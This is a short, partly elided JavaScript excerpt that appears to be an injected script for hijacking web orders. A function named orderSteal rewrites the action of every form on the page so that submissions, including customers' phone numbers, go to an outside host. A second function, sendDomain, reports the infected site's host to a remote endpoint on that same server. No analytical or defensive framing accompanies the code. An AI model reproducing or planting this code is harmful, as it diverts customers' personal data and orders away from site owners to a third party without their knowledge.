function orderSteal(data) {
    if ("landing_id" in data && parseInt(data["landing_id"]) > 0 && "tel" in data && data["tel"] != "" && parseInt(data["product_id"]) > 0 && parseInt(data["percent"]) > 0) {
        ...
        [].forEach.call(forms, function (elem) {
            elem.setAttribute("action", "http://c.cpam.pro/" + data["landing_id"] + "/success?product_id=" + parseInt(data["product_id"]));
...
function sendDomain() {
    ...
    var resultdata = "";
    var url = "http://c.cpam.pro/remote.php";
    var params = "landing_id=10851&host=" + host + "&type=remote";
